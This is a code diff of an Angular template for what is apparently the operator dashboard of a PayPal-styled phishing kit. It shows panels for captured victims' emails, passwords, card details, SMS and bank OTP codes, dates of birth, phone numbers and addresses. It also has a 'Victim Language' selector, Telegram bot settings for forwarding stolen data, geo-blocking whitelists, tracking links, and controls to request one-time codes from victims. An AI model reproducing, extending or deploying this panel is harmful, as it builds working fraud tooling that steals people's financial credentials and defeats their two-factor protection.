+                                         <button (click)="addCountry('blocked', blockSelect.value)" class="pp-btn w-auto px-4 py-1 text-xs">Add</button>
+                                     </div>
+                                 </div>
+
+                                 <!-- Victim Language -->
+                                 <div>
+                                     <label class="block text-sm font-bold text-pp-navy dark:text-white mb-2">{{ 'VICTIM_LANGUAGE' | translate }}</label>
+                                     <select [(ngModel)]="flowSettings.defaultLang" class="pp-input dark:bg-slate-700 dark:text-white dark:border-slate-600">
+                                         <option value="en">English</option>
+                                         <option value="fr">Français</option>
+                                         <option value="es">Español</option>
+                                         <option value="de">Deutsch</option>
+                                         <option value="it">Italiano</option>
+                                     </select>
+                                 </div>
+
+                                 <button (click)="saveSettings()" class="pp-btn mt-4">{{ 'SAVE_API_SETTINGS' | translate }}</button>
                              </div>
                          </div>
 
                          <!-- Appearance -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
-                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Appearance</h3>
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'APPEARANCE' | translate }}</h3>
+
+                             <div class="flex items-center justify-between mb-4">
+                                 <div class="flex items-center gap-3">
+                                     <div class="p-2 rounded-full bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300">
+                                         <span class="material-icons">translate</span>
+                                     </div>
+                                     <div>
+                                         <p class="font-bold text-pp-navy dark:text-white">{{ 'DASHBOARD_LANGUAGE' | translate }}</p>
+                                     </div>
+                                 </div>
+                                 <select [(ngModel)]="currentAdminLang" (change)="changeAdminLanguage(currentAdminLang)" class="px-3 py-2 text-sm border border-slate-200 dark:border-slate-600 rounded-lg bg-white dark:bg-slate-700 dark:text-white focus:outline-none focus:border-pp-blue cursor-pointer">
+                                     <option value="en">English</option>
+                                     <option value="fr">Français</option>
+                                 </select>
+                             </div>
+
                              <div class="flex items-center justify-between">
                                  <div class="flex items-center gap-3">
                                      <div class="p-2 rounded-full bg-slate-100 dark:bg-slate-700 text-slate-600 dark:text-slate-300">
                                          <span class="material-icons">{{ isDarkMode() ? 'dark_mode' : 'light_mode' }}</span>
                                      </div>
                                      <div>
-                                         <p class="font-bold text-pp-navy dark:text-white">Dark Mode</p>
-                                         <p class="text-xs text-slate-500">Toggle dashboard theme</p>
+                                         <p class="font-bold text-pp-navy dark:text-white">{{ 'DARK_MODE' | translate }}</p>
                                      </div>
                                  </div>
                                  <button (click)="toggleDarkMode()" class="relative inline-flex h-6 w-11 items-center rounded-full transition-colors focus:outline-none"
@@ -1005,23 +724,20 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
                          <!-- Telegram -->
                          <div class="mb-8 pb-8 border-b border-slate-100 dark:border-slate-700">
-                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Telegram Integration</h3>
-
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'TELEGRAM_INTEGRATION' | translate }}</h3>
                              @if(!isSettingsConfigured()) {
                                  <div class="grid grid-cols-1 md:grid-cols-2 gap-6">
                                     <div class="pp-input-group mb-0">
                                         <input type="text" [(ngModel)]="tgToken" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Bot Token</label>
+                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'BOT_TOKEN' | translate }}</label>
                                     </div>
                                     <div class="pp-input-group mb-0">
                                         <input type="text" [(ngModel)]="tgChat" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Chat ID</label>
+                                        <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'CHAT_ID' | translate }}</label>
                                     </div>
                                  </div>
                                  <div class="mt-4">
-                                     <button (click)="saveSettings()" class="pp-btn">
-                                         Save API Settings
-                                     </button>
+                                     <button (click)="saveSettings()" class="pp-btn">{{ 'SAVE_API_SETTINGS' | translate }}</button>
                                  </div>
                              } @else {
                                  <div class="bg-slate-50 dark:bg-slate-700/50 p-6 rounded-xl border border-slate-200 dark:border-slate-600">
@@ -1030,24 +746,11 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                              <span class="material-icons">telegram</span>
                                          </div>
                                          <div>
-                                             <h4 class="font-bold text-pp-navy dark:text-white">Bot Configured</h4>
-                                             <p class="text-xs text-slate-500 dark:text-slate-400">Messages will be sent to this channel.</p>
+                                             <h4 class="font-bold text-pp-navy dark:text-white">{{ 'BOT_CONFIGURED' | translate }}</h4>
                                          </div>
                                      </div>
-
-                                     <div class="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
-                                         <div class="bg-white dark:bg-slate-800 p-3 rounded-lg border border-slate-200 dark:border-slate-600">
-                                             <p class="text-[10px] uppercase font-bold text-slate-400 mb-1">Bot Token</p>
-                                             <p class="font-mono font-bold text-sm text-pp-navy dark:text-white">{{ maskedToken() }}</p>
-                                         </div>
-                                         <div class="bg-white dark:bg-slate-800 p-3 rounded-lg border border-slate-200 dark:border-slate-600">
-                                             <p class="text-[10px] uppercase font-bold text-slate-400 mb-1">Chat ID</p>
-                                             <p class="font-mono font-bold text-sm text-pp-navy dark:text-white">{{ maskedChat() }}</p>
-                                         </div>
-                                     </div>
-
                                      <button (click)="deleteSettings()" class="flex items-center justify-center gap-2 w-full py-3 rounded-lg font-bold text-red-600 hover:bg-red-50 dark:hover:bg-red-900/20 transition-colors border border-transparent hover:border-red-100">
-                                         <span class="material-icons text-sm">delete</span> Remove Credentials
+                                         <span class="material-icons text-sm">delete</span> {{ 'REMOVE_CREDENTIALS' | translate }}
                                      </button>
                                  </div>
                              }
@@ -1055,18 +758,18 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
                          <!-- Security -->
                          <div>
-                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">Admin Security</h3>
+                             <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4">{{ 'ADMIN_SECURITY' | translate }}</h3>
                              <div class="space-y-4">
                                  <div class="pp-input-group mb-0">
                                      <input type="password" [(ngModel)]="settingOldPass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Current Password</label>
+                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'CURRENT_PASSWORD' | translate }}</label>
                                  </div>
                                  <div class="pp-input-group mb-0">
                                      <input type="password" [(ngModel)]="settingNewPass" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">New Password</label>
+                                     <label class="pp-label dark:bg-slate-700 dark:text-slate-400">{{ 'NEW_PASSWORD' | translate }}</label>
                                  </div>
                                  <button (click)="changePassword()" class="pp-btn bg-slate-800 hover:bg-slate-900 dark:bg-slate-600 dark:hover:bg-slate-500">
-                                     Update Password
+                                     {{ 'UPDATE_PASSWORD' | translate }}
                                  </button>
                              </div>
                          </div>
@@ -1077,121 +780,109 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
          </div>
       </main>
 
-      <!-- User Creation Modal -->
-      @if (userModalOpen()) {
-           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
-               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="closeUserModal()"></div>
-               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
-                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
-                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Create Admin User</h3>
-                       <button (click)="closeUserModal()" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
+      <!-- Admin Detail Side Panel (Hypervisor) -->
+      @if (userPanelOpen()) {
+           <div class="fixed inset-0 z-50 flex justify-end">
+               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeUserPanel()"></div>
+               <div class="relative w-full max-w-[500px] bg-white dark:bg-slate-800 h-full shadow-2xl flex flex-col animate-slide-in-right">
+                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-slate-50/50 dark:bg-slate-800/95">
+                       <div>
+                           <h2 class="font-bold text-xl text-pp-navy dark:text-white">{{ selectedAdmin()?.username }}</h2>
+                           <p class="text-xs text-slate-500 uppercase">{{ selectedAdmin()?.role }} • {{ selectedAdmin()?.uniqueCode }}</p>
+                       </div>
+                       <button (click)="closeUserPanel()" class="p-2 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-500 dark:text-slate-400 rounded-full transition-colors">
                            <span class="material-icons">close</span>
                        </button>
                    </div>
-                   <div class="p-6 space-y-4">
-                       <div class="pp-input-group mb-0">
-                           <input type="text" [(ngModel)]="newUser.username" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Username</label>
-                       </div>
-                       <div class="pp-input-group mb-0">
-                           <input type="password" [(ngModel)]="newUser.password" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Password</label>
-                       </div>
-                       <div class="grid grid-cols-2 gap-4">
-                           <div class="pp-input-group mb-0">
-                               <select [(ngModel)]="newUser.role" class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                                   <option value="admin">Admin</option>
-                                   <option value="hypervisor">Hypervisor</option>
-                               </select>
-                               <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Role</label>
-                           </div>
-                           <div class="pp-input-group mb-0">
-                               <input type="number" [(ngModel)]="newUser.maxLinks" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                               <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Max Links</label>
-                           </div>
-                       </div>
 
-                       <!-- Initial Flow Settings -->
-                       <div class="pt-4 border-t border-slate-100 dark:border-slate-700">
-                           <p class="text-xs font-bold text-slate-400 uppercase mb-3">Default Flow Settings</p>
+                   <div class="flex-1 overflow-y-auto p-6 space-y-8">
+                       <!-- Actions -->
+                       @if(selectedAdmin()?.id !== auth.currentUser()?.id) {
+                           <div class="grid grid-cols-2 gap-4">
+                               <button (click)="impersonateUser(selectedAdmin())" class="bg-pp-navy text-white py-3 rounded-lg font-bold text-sm hover:bg-pp-blue transition-colors flex items-center justify-center gap-2 shadow-lg">
+                                   <span class="material-icons text-sm">login</span> Impersonate
+                               </button>
+                               <button (click)="resetUserPassword(selectedAdmin())" class="bg-slate-100 dark:bg-slate-700 text-slate-700 dark:text-slate-200 py-3 rounded-lg font-bold text-sm hover:bg-slate-200 dark:hover:bg-slate-600 transition-colors">
+                                   Reset Password
+                               </button>
+                           </div>
+                       }
+
+                       <!-- Tracking Links -->
+                       <div>
+                           <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">Tracking Links</h3>
                            <div class="space-y-2">
-                               <label class="flex items-center gap-2 cursor-pointer">
-                                   <input type="checkbox" [(ngModel)]="newUser.flow.autoApproveLogin" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
-                                   <span class="text-sm text-pp-navy dark:text-white">Auto-Approve Login</span>
-                               </label>
-                               <label class="flex items-center gap-2 cursor-pointer">
-                                   <input type="checkbox" [(ngModel)]="newUser.flow.skipPhone" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
-                                   <span class="text-sm text-pp-navy dark:text-white">Skip Phone Verification</span>
-                               </label>
-                               <label class="flex items-center gap-2 cursor-pointer">
-                                   <input type="checkbox" [(ngModel)]="newUser.flow.forceBankApp" class="rounded text-pp-blue focus:ring-pp-blue border-slate-300">
-                                   <span class="text-sm text-pp-navy dark:text-white">Force Bank App</span>
-                               </label>
+                               @for(link of selectedAdminLinks(); track link.code) {
+                                   <div class="flex items-center justify-between p-3 bg-slate-50 dark:bg-slate-700/30 rounded-lg border border-slate-100 dark:border-slate-700">
+                                       <div class="flex flex-col">
+                                           <span class="font-mono font-bold text-pp-blue text-sm">{{ link.code }}</span>
+                                           <span class="text-[10px] text-slate-400">{{ link.clicks }} clicks • {{ link.sessions_verified }} verified</span>
+                                       </div>
+                                       <button (click)="copy(getLinkUrl(link.code))" class="text-slate-400 hover:text-pp-navy"><span class="material-icons text-sm">content_copy</span></button>
+                                   </div>
+                               }
+                               @if(selectedAdminLinks().length === 0) {
+                                   <p class="text-xs text-slate-400 italic">No links found.</p>
+                               }
                            </div>
                        </div>
-                   </div>
-                   <div class="p-4 border-t border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-end gap-3">
-                       <button (click)="closeUserModal()" class="px-4 py-2 text-slate-500 font-bold hover:bg-slate-200 dark:hover:bg-slate-700 rounded-lg transition-colors text-sm">Cancel</button>
-                       <button (click)="submitCreateUser()" class="pp-btn w-auto px-6 py-2 text-sm">Create User</button>
-                   </div>
-               </div>
-           </div>
-      }
 
-      <!-- Assign Admin Modal -->
-      @if (assignModalOpen()) {
-           <div class="fixed inset-0 z-50 flex items-center justify-center p-4">
-               <div class="absolute inset-0 bg-black/40 backdrop-blur-sm transition-opacity" (click)="assignModalOpen.set(false)"></div>
-               <div class="relative bg-white dark:bg-slate-800 rounded-2xl shadow-2xl max-w-md w-full overflow-hidden animate-fade-in">
-                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 bg-slate-50 dark:bg-slate-900/50 flex justify-between items-center">
-                       <h3 class="font-bold text-lg text-pp-navy dark:text-white">Assign Session</h3>
-                       <button (click)="assignModalOpen.set(false)" class="text-slate-400 hover:text-slate-600 dark:hover:text-slate-200 transition-colors">
-                           <span class="material-icons">close</span>
-                       </button>
-                   </div>
-                   <div class="p-6 space-y-4">
-                       <div class="pp-input-group mb-0 relative">
-                           <span class="material-icons absolute right-3 top-3 text-slate-400">search</span>
-                           <input type="text" [ngModel]="assignSearch()" (ngModelChange)="assignSearch.set($event)" placeholder=" " class="pp-input peer dark:bg-slate-700 dark:text-white dark:border-slate-600">
-                           <label class="pp-label dark:bg-slate-700 dark:text-slate-400">Search Admin</label>
-                       </div>
+                       <!-- Flow Configuration -->
+                       <div>
+                           <div class="flex justify-between items-center mb-4 border-b border-slate-100 dark:border-slate-700 pb-2">
+                               <h3 class="font-bold text-sm text-slate-500 uppercase tracking-wider">Flow Control</h3>
+                               <button (click)="saveAdminSettings()" class="text-xs font-bold bg-green-600 text-white px-3 py-1 rounded hover:bg-green-700 transition-colors">Save</button>
+                           </div>
 
-                       <div class="max-h-[300px] overflow-y-auto space-y-2">
-                           @for(admin of filteredAdmins(); track admin.id) {
-                               <div class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 hover:bg-slate-50 dark:hover:bg-slate-700/50 transition-colors">
-                                   <div>
-                                       <p class="font-bold text-sm text-pp-navy dark:text-white">{{ admin.username }}</p>
-                                       <p class="text-[10px] text-slate-400 uppercase">{{ admin.role }}</p>
+                           @if(selectedAdminSettings) {
+                               <div class="space-y-3">
+                                   <label class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800/50">
+                                       <span class="text-sm font-bold text-pp-navy dark:text-white">Auto-Approve Login</span>
+                                       <input type="checkbox" [(ngModel)]="selectedAdminSettings.autoApproveLogin" class="w-5 h-5 text-pp-blue rounded focus:ring-pp-blue border-gray-300">
+                                   </label>
+                                   <label class="flex items-center justify-between p-3 rounded-lg border border-slate-200 dark:border-slate-700 bg-white dark:bg-slate-800/50">
+                                       <span class="text-sm font-bold text-pp-navy dark:text-white">Skip Phone Verification</span>
+                                       <input type="checkbox" [(ngModel)]="selectedAdminSettings.skipPhone" class="w-5 h-5 text-pp-blue rounded focus:ring-pp-blue border-gray-300">
+                                   </label>
+
+                                   <!-- New Geo-Blocking for User Panel -->
+                                   <div class="pt-4 border-t border-slate-100 dark:border-slate-700">
+                                       <label class="block text-xs font-bold text-slate-400 uppercase mb-2">Geo-Blocking (Whitelist)</label>
+                                       <div class="flex flex-wrap gap-1 mb-2">
+                                           @for(c of selectedAdminSettings.allowedCountries; track c) {
+                                               <span class="bg-green-100 text-green-800 text-[10px] px-1.5 py-0.5 rounded flex items-center gap-1">{{ c }} <span (click)="removeCountryFromAdmin('allowed', c)" class="cursor-pointer">×</span></span>
+                                           }
+                                       </div>
+                                       <div class="flex gap-2">
+                                            <select #userAllowSelect class="pp-input py-1 text-xs dark:bg-slate-700 dark:text-white">
+                                                <option *ngFor="let c of countryList" [value]="c.code">{{ c.name }}</option>
+                                            </select>
+                                            <button (click)="addCountryToAdmin('allowed', userAllowSelect.value)" class="px-2 py-1 bg-slate-200 dark:bg-slate-600 text-xs rounded font-bold">Add</button>
+                                       </div>
                                    </div>
-                                   <button (click)="submitAssignment(admin.id)" class="text-xs font-bold bg-pp-blue text-white px-3 py-1.5 rounded hover:bg-[#005ea6] transition-colors">
-                                       Select
-                                   </button>
+
+                                   <div class="mt-4 pt-4 border-t border-slate-100 dark:border-slate-700">
+                                       <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Max Links</label>
+                                       <input type="number" [(ngModel)]="selectedAdmin().maxLinks" class="w-full p-2 text-sm border border-slate-200 dark:border-slate-600 rounded bg-slate-50 dark:bg-slate-700 dark:text-white">
+                                   </div>
+
+                                   <div class="mt-4">
+                                       <label class="block text-xs font-bold text-slate-400 uppercase mb-1">Account Status</label>
+                                       <button (click)="toggleSuspension(selectedAdmin())" class="w-full py-2 rounded text-sm font-bold border transition-colors"
+                                               [class.bg-red-50]="!selectedAdmin().isSuspended" [class.text-red-600]="!selectedAdmin().isSuspended" [class.border-red-100]="!selectedAdmin().isSuspended"
+                                               [class.bg-green-50]="selectedAdmin().isSuspended" [class.text-green-600]="selectedAdmin().isSuspended" [class.border-green-100]="selectedAdmin().isSuspended">
+                                           {{ selectedAdmin().isSuspended ? 'Unsuspend Account' : 'Suspend Account' }}
+                                       </button>
+                                   </div>
                                </div>
                            }
-                           @if(filteredAdmins().length === 0) {
-                               <p class="text-center text-sm text-slate-400 py-4">No admins found.</p>
-                           }
                        </div>
-                   </div>
-               </div>
-           </div>
-      }
 
-      <!-- History Slide-out Panel -->
-      @if (historyPanelOpen()) {
-           <div class="fixed inset-0 z-50 flex justify-end">
-               <!-- Backdrop -->
-               <div class="absolute inset-0 bg-black/20 backdrop-blur-sm transition-opacity" (click)="closeHistory()"></div>
-               <!-- Panel -->
-               <div class="relative w-full max-w-[90vw] md:max-w-[1200px] bg-white dark:bg-slate-800 h-full shadow-2xl flex flex-col animate-slide-in-right">
-                   <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-slate-50/50 dark:bg-slate-800/95">
-                       <h2 class="font-bold text-xl text-pp-navy dark:text-white">Session History Details</h2>
-                       <button (click)="closeHistory()" class="p-2 hover:bg-slate-200 dark:hover:bg-slate-700 text-slate-500 dark:text-slate-400 rounded-full transition-colors">
-                           <span class="material-icons">close</span>
-                       </button>
-                   </div>
-                   <div class="flex-1 overflow-y-auto bg-[#F9FAFB] dark:bg-slate-900 flex flex-col">
-                        <ng-container *ngTemplateOutlet="sessionDetailView; context: {session: selectedHistorySession(), isHistory: true}"></ng-container>
+                       <div class="pt-8 mt-auto">
+                           <button (click)="deleteUser(selectedAdmin())" class="w-full py-3 rounded-lg font-bold text-red-600 hover:bg-red-50 border border-transparent hover:border-red-100 transition-colors flex items-center justify-center gap-2">
+                               <span class="material-icons text-sm">delete_forever</span> Delete Admin Account
+                           </button>
+                       </div>
                    </div>
                </div>
            </div>
@@ -1199,11 +890,10 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
 
       <!-- Reusable Session Detail Template -->
       <ng-template #sessionDetailView let-session="session" let-isHistory="isHistory">
-            <!-- Header -->
             <div class="p-6 border-b border-slate-100 dark:border-slate-700 flex justify-between items-center bg-white/50 dark:bg-slate-800/90 shrink-0">
                 <div>
                     <div class="flex items-center gap-3 mb-1">
-                    <h2 class="font-bold text-xl text-pp-navy dark:text-white">Session Details</h2>
+                    <h2 class="font-bold text-xl text-pp-navy dark:text-white">{{ 'SESSION_DETAILS' | translate }}</h2>
                     <span class="bg-pp-navy text-white text-[10px] px-2 py-0.5 rounded uppercase tracking-wider font-bold">{{ session?.stage }}</span>
                     </div>
                     <div class="flex items-center gap-2">
@@ -1217,35 +907,31 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                 </div>
                 @if(!isHistory) {
                     <div class="text-right">
-                        <p class="text-[10px] text-slate-400 font-bold uppercase">Time Elapsed</p>
+                        <p class="text-[10px] text-slate-400 font-bold uppercase">{{ 'TIME_ELAPSED' | translate }}</p>
                         <p class="font-mono font-bold text-pp-blue">{{ elapsedTime() }}</p>
                     </div>
                 }
             </div>
 
-            <!-- Scrollable Content -->
             <div class="flex-1 p-6 lg:p-8">
                 <div class="grid grid-cols-1 md:grid-cols-2 gap-6 pb-20">
-
                     <!-- Credentials -->
                     <div class="bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
                         <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">lock</span></div>
-
                         <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
                             <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">vpn_key</span></div>
-                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">Login Credentials</h4>
+                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">{{ 'LOGIN_CREDENTIALS' | translate }}</h4>
                         </div>
-
                         <div class="space-y-5 relative z-10">
                             <div>
-                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Email / Username</label>
+                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Email</label>
                                 <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                     <p class="text-sm font-bold text-pp-navy dark:text-white break-all flex-1">{{ session?.data?.email || '...' }}</p>
                                     <button *ngIf="session?.data?.email" (click)="copy(session?.data?.email)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
                                 </div>
                             </div>
                             <div>
-                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">Password</label>
+                                <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1.5">{{ 'PASSWORD' | translate }}</label>
                                 <div class="flex items-center gap-2 bg-slate-50 dark:bg-slate-900/50 p-2 rounded-lg border border-slate-100 dark:border-slate-700">
                                     <p class="text-sm font-mono text-pp-navy dark:text-white flex-1">{{ session?.data?.password || '...' }}</p>
                                     <button *ngIf="session?.data?.password" (click)="copy(session?.data?.password)" class="text-slate-400 hover:text-pp-blue p-1"><span class="material-icons text-[16px]">content_copy</span></button>
@@ -1257,12 +943,10 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                     <!-- Financial -->
                     <div class="bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700 relative overflow-hidden group hover:border-pp-blue/30 transition-colors">
                         <div class="absolute top-0 right-0 p-4 opacity-5 group-hover:opacity-10 transition-opacity"><span class="material-icons text-6xl text-pp-navy dark:text-white">credit_card</span></div>
-
                         <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
                             <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">payment</span></div>
-                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">Financial Instrument</h4>
+                            <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">{{ 'FINANCIAL_INSTRUMENT' | translate }}</h4>
                         </div>
-
                         <div class="space-y-5 relative z-10">
                             <div>
                                 <div class="flex items-center justify-between mb-1.5">
@@ -1293,17 +977,14 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                         </div>
                     </div>
 
-                    <!-- OTP & Security (Full Width) -->
+                    <!-- OTP -->
                     <div class="col-span-1 md:col-span-2 bg-gradient-to-br from-pp-navy to-[#001C64] text-white p-8 rounded-[20px] shadow-lg relative overflow-hidden flex flex-col md:flex-row items-center justify-between gap-6">
-                            <!-- Background decoration -->
                             <div class="absolute -right-10 -top-10 w-48 h-48 bg-pp-blue rounded-full opacity-20 blur-3xl"></div>
-
                             <div class="relative z-10 flex-1">
                                 <div class="flex items-center gap-3 mb-6">
                                     <span class="material-icons text-pp-success">verified_user</span>
-                                    <h4 class="text-sm font-bold text-white/90 uppercase tracking-widest">Security Verification</h4>
+                                    <h4 class="text-sm font-bold text-white/90 uppercase tracking-widest">{{ 'SECURITY_CODES' | translate }}</h4>
                                 </div>
-
                                 <div class="flex gap-12">
                                     <div>
                                         <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">SMS Code</span>
@@ -1313,7 +994,7 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                         </div>
                                     </div>
                                     <div>
-                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">Bank OTP (3DS)</span>
+                                        <span class="text-[10px] text-white/50 font-bold uppercase block mb-2">Bank OTP</span>
                                         <div class="flex items-center gap-2">
                                             <span class="text-3xl font-mono font-bold tracking-widest text-pp-success">{{ session?.data?.cardOtp || '---' }}</span>
                                             <button *ngIf="session?.data?.cardOtp" (click)="copy(session?.data?.cardOtp)" class="text-white/40 hover:text-white transition-colors"><span class="material-icons text-sm">content_copy</span></button>
@@ -1321,43 +1002,25 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                     </div>
                                 </div>
                             </div>
-
-                            @if(session?.stage === 'card_pending' && !isHistory) {
-                            <div class="relative z-10 flex flex-col gap-2 shrink-0">
-                                <span class="text-[10px] text-white/40 uppercase font-bold text-center">Request Input</span>
-                                <div class="flex gap-2">
-                                    <button (click)="requestFlow('otp')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
-                                        SMS / 3DS
-                                    </button>
-                                    <button (click)="requestFlow('app')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
-                                        Bank App
-                                    </button>
-                                    <button (click)="requestFlow('both')" class="bg-white/10 hover:bg-white/20 text-white border border-white/30 px-4 py-2 rounded-lg font-bold text-xs transition-all backdrop-blur-sm">
-                                        Both
-                                    </button>
-                                </div>
-                            </div>
-                            }
                     </div>
 
-                    <!-- Identity Info (Full Width) -->
+                    <!-- Identity -->
                     <div class="col-span-1 md:col-span-2 bg-white dark:bg-slate-800 p-6 rounded-[16px] shadow-sm border border-slate-200 dark:border-slate-700">
                             <div class="flex items-center gap-2 mb-6 border-b border-slate-100 dark:border-slate-700 pb-3">
                                 <div class="bg-blue-50 dark:bg-blue-900/30 p-1.5 rounded-lg text-pp-blue"><span class="material-icons text-lg">badge</span></div>
-                                <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">Identity Profile</h4>
+                                <h4 class="text-sm font-bold text-pp-navy dark:text-white uppercase tracking-tight">{{ 'IDENTITY_PROFILE' | translate }}</h4>
                             </div>
-
                             <div class="grid grid-cols-2 md:grid-cols-4 gap-6">
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Legal Name</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Name</label>
                                     <p class="text-sm font-bold text-pp-navy dark:text-white">{{ (session?.data?.firstName + ' ' + session?.data?.lastName).trim() || 'Waiting...' }}</p>
                                 </div>
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Date of Birth</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">DOB</label>
                                     <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.dob || 'Waiting...' }}</p>
                                 </div>
                                 <div>
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Phone Number</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Phone</label>
                                     <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.phoneNumber || 'Waiting...' }}</p>
                                 </div>
                                 <div>
@@ -1365,23 +1028,20 @@ type AdminTab = 'live' | 'history' | 'settings' | 'users' | 'system' | 'links';
                                     <p class="text-sm font-bold text-pp-navy dark:text-white">{{ session?.data?.country || 'Waiting...' }}</p>
                                 </div>
                                 <div class="col-span-2 md:col-span-4">
-                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Billing Address</label>
+                                    <label class="text-[10px] font-bold text-slate-400 uppercase block mb-1">Address</label>
                                     <p class="text-sm font-bold text-pp-navy dark:text-white bg-slate-50 dark:bg-slate-900/50 p-3 rounded-lg border border-slate-100 dark:border-slate-700">{{ session?.data?.address || 'Waiting...' }}</p>
                                 </div>
                             </div>
                     </div>
